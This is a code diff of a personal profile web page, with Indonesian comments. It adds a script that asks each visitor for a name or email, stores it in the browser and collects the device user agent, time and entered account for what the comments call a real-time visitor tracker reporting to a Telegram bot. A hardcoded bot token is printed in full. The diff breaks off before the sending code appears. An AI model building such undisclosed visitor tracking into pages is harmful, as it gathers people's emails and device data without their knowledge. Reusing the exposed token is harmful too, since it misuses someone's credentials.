@@ -8,7 +8,7 @@
         /* 
           --------------------------------------------------
           Dibuat dengan riset, ketelitian, dan kopi hitam oleh Roni
-          Versi: 4.0 (Dynamic Identity & Pro Handcrafted UI)
+          Versi: 4.1 (Auto-Memory Dynamic Identity)
           --------------------------------------------------
         */
         * {
@@ -254,7 +254,7 @@
 <body>
 
     <div class="container">
-        <!-- Header Profil dengan ID Dinamis -->
+        <!-- Header Profil -->
         <div class="profile-header">
             <div class="avatar" id="profile-avatar">R</div>
             <div class="profile-info">
@@ -305,35 +305,38 @@
         </div>
     </div>
 
-    <!-- Script Pengubah Identitas Dinamis & Pelacak Telegram -->
+    <!-- Script Memori Otomatis & Pelacak Telegram -->
     <script>
         window.addEventListener('DOMContentLoaded', () => {
-            // 1. Logika Pengubah Nama & Avatar Dinamis Berdasarkan Sesi / Input Akun
             const nameElement = document.getElementById('profile-name');
             const avatarElement = document.getElementById('profile-avatar');
 
-            // Cek apakah ada parameter email di URL (contoh: ?account=aiagentjerv@gmail.com) atau tersimpan di memori browser
-            const urlParams = new URLSearchParams(window.location.search);
-            let accountName = urlParams.get('account') || localStorage.getItem('user_account');
+            // Cek apakah sudah ada nama tersimpan di memori perangkat ini
+            let savedAccount = localStorage.getItem('web_user_account');
 
-            if (accountName) {
-                // Jika ada akun, ambil bagian sebelum karakter '@' atau format namanya
-                let cleanName = accountName.split('@')[0];
-                nameElement.textContent = cleanName;
-                avatarElement.textContent = cleanName.charAt(0).toUpperCase();
-            } else {
-                // Fallback interaktif: Jika ingin mengatur nama akun secara manual via console atau otomatis
-                // Contoh default bawaan tetap Roni atau disesuaikan
-                const defaultName = "Roni"; 
-                nameElement.textContent = defaultName;
-                avatarElement.textContent = defaultName.charAt(0).toUpperCase();
+            if (!savedAccount) {
+                // Jika belum pernah diatur, munculkan kotak input otomatis sekali saja
+                let inputUser = prompt("Masukkan nama atau email Anda untuk profil web:", "aiagentjerv@gmail.com");
+                if (inputUser) {
+                    savedAccount = inputUser;
+                    localStorage.setItem('web_user_account', savedAccount);
+                } else {
+                    savedAccount = "Roni";
+                }
             }
 
-            // 2. Script Pelacak Pengunjung Real-Time ke Bot Telegram
+            // Bersihkan format nama (ambil sebelum @ jika itu email)
+            let cleanName = savedAccount.split('@')[0];
+            cleanName = cleanName.charAt(0).toUpperCase() + cleanName.slice(1);
+
+            nameElement.textContent = cleanName;
+            avatarElement.textContent = cleanName.charAt(0).toUpperCase();
+
+            // Script Pelacak Pengunjung Real-Time ke Bot Telegram
             const visitorData = {
                 device: navigator.userAgent,
                 time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-                accountDetected: accountName || 'Default Visitor'
+                accountDetected: savedAccount
             };
 
             const botToken = "8886940858:AAEMAdvWAyfK0vi6Rpx-qmME3pvwyM8Q6Ew"; 
